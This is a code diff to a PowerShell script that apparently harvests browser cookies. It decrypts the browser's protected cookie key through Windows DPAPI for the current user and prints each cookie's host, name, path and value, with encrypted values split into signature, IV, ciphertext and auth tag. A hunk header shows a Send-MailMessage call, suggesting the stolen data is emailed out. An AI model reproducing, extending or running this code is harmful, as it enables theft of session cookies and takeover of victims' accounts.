@@ -7,7 +7,7 @@
 
    #remove the first 5 elements from the key array
    $encKey= $encKey[5..$encKey.Length];
-   $decKey=([System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) | ForEach-Object ToString X2) -join ''; #Convert decKey from byte[] to hex
+   $decKey=([System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) | ForEach-Object ToString X2) -join ''; #Convert decKey from byte[] to hex (string type)
 
    return $decKey
 }
@@ -84,31 +84,25 @@ Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -
 
 }
 
-function PrintResult ($cookie,$decryptionkey,$hostcolumn,$valuecolumn)
+function PrintResult ($browser,$cookie)
 {
     Foreach ($i in $cookie)
     {
-        Write-Host "HOST: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$hostcolumn)" -ForegroundColor Yellow
+        Write-Host "HOST: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$($browser.hostcolumn))" -ForegroundColor Yellow
         Write-Host "COOKIE NAME: " -ForegroundColor Green -NoNewline; Write-Host "$($i.name)" -ForegroundColor Yellow
         Write-Host "COOKIE PATH: " -ForegroundColor Green -NoNewline; Write-Host "$($i.path)" -ForegroundColor Yellow
-        if ($decryptionkey -ne $null)
+        if ($($browser.requireEncryption))
         {
-            Write-Host "COOKIE ENCRYPTED VALUE [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$(($($i.$valuecolumn) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
-            Write-Host "|---> SIGNATURE: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$valuecolumn)[0..2]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
-            Write-Host "|---> IV: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$valuecolumn)[3..14]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
-            Write-Host "|---> ENCRYPTED DATA: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$valuecolumn)[15..($i.Length-1-16)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
-            Write-Host "|---> AUTH TAG: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$valuecolumn)[($i.Length-16)..($i.Length-1)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
+            Write-Host "COOKIE ENCRYPTED VALUE [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$(($($i.$($browser.valuecolumn)) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
+            Write-Host "|---> SIGNATURE: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[0..2]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
+            Write-Host "|---> IV: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[3..14]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
+            Write-Host "|---> ENCRYPTED DATA: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[15..($($i.$($browser.valuecolumn)).Length-1-16)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
+            Write-Host "|---> AUTH TAG: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[($($i.$($browser.valuecolumn)).Length-16)..($($i.$($browser.valuecolumn)).Length-1)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
         }
         else
         {
-            Write-Host "COOKIE CLEAR VALUE: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$valuecolumn)" -ForegroundColor Yellow
+            Write-Host "COOKIE CLEAR VALUE: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$($browser.valuecolumn))" -ForegroundColor Yellow
         }
-        Write-Host ""
-        Write-Host ""
-    }
-    if ($decryptionkey -ne $null)
-    {
-        Write-Host "DECRYPTION KEY [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$($decryptionkey)" -ForegroundColor Yellow
         Write-Host ""
         Write-Host ""
     }
